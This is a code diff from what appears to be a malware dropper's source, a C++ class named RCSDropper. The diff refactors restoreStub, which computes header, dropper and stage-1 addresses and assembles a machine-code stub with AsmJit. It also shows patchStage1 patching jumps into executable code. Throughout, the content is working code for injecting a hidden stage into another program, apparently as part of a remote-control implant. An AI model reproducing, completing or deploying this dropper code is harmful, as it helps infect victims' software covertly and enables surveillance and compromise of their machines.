@@ -47,27 +47,29 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD jumpToVA)
 	stub.relocCode( (void*) ptr );
 }
 
+// XXX need of calling for size of stub makes restoreStub messy ... refactor!!
 std::size_t RCSDropper::restoreStub( DWORD currentVA )
 {
-	unsigned char* restore = ptr_ ( offset_.restore );
+	unsigned char* restore = NULL;
+	DropperHeader* h = NULL;
+	DWORD headerVA, dropperVA, stage1VA;
 
-	DropperHeader* h = header();
-	if (offset_.header == 0) // if header offset is 0, header ptr will be invalid
-		h = NULL;
-
-	DBGTRACE_HEX("Restore  VA : ", currentVA, NOTIFY );
-
-	DWORD headerVA = currentVA + offset_.header;
-	DBGTRACE_HEX("Header   VA : ", headerVA, NOTIFY );
-
-	DWORD dropperVA = headerVA + sizeof(DropperHeader);
-	DBGTRACE_HEX("Dropper  VA : ", dropperVA, NOTIFY );
-
-	DWORD stage1VA = 0;
-	if (h) // if we have a valid header
+	if (currentVA == 0) {
+		headerVA = 0xFFFFFFFF;
+		dropperVA = 0xFFFFFFFF;
+		stage1VA = 0xFFFFFFFF;
+	} else {
+		restore = ptr_ ( offset_.restore );
+		h = header();
+		headerVA = currentVA + offset_.header;
+		dropperVA = headerVA + sizeof(DropperHeader);
 		stage1VA = h->stage1.VA;
 
-	DBGTRACE_HEX("Stage1   VA : ", stage1VA, NOTIFY);
+		DBGTRACE_HEX("Restore  VA : ", currentVA, NOTIFY );
+		DBGTRACE_HEX("Header   VA : ", headerVA, NOTIFY );
+		DBGTRACE_HEX("Dropper  VA : ", dropperVA, NOTIFY );
+		DBGTRACE_HEX("Stage1   VA : ", stage1VA, NOTIFY);
+	}
 
 	AsmJit::Assembler stub;
 	stub.pushfd();
@@ -164,7 +166,7 @@ RCSDropper::RCSDropper(const char* filepath)
 
 	// calculate all offsets
 	offset_.restore = 0;
-	offset_.header = 0;
+
 	offset_.header = std::max<std::size_t>(restoreStub( 0 ), 32);
 	DBGTRACE("Size of restore stub: ", offset_.header, NOTIFY);
 	// XXX magic number!
